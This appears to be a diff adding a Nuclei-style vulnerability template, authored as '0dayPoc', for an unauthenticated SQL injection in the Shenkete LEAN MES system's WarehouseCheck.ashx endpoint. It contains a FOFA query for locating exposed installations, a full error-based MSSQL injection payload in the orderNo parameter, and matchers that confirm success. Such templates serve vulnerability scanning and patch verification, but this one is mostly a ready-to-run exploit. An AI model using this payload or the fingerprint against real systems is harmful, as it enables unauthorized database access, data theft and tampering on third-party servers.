@@ -1,0 +1,28 @@
+id: shenkete-lean-mes-warehousecheck-sqli
+
+info:
+  name: "深科特LEAN MES系统WarehouseCheck.ashx接口SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+      深科特LEAN MES系统WarehouseCheck.ashx接口存在SQL注入安全缺陷，攻击者可通过构造恶意输入参数在数据库层执行任意SQL语句。该漏洞允许远程未授权访问者绕过验证机制，实现数据泄露、篡改或删除等操作。通过FOFA特征可精准定位目标资产，漏洞验证需结合特定注入载荷触发。
+  tags: 深科特
+
+http:
+- raw:
+  - |
+    GET /Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289304%3D9304%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+keHv&itemCode=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'qbqb'
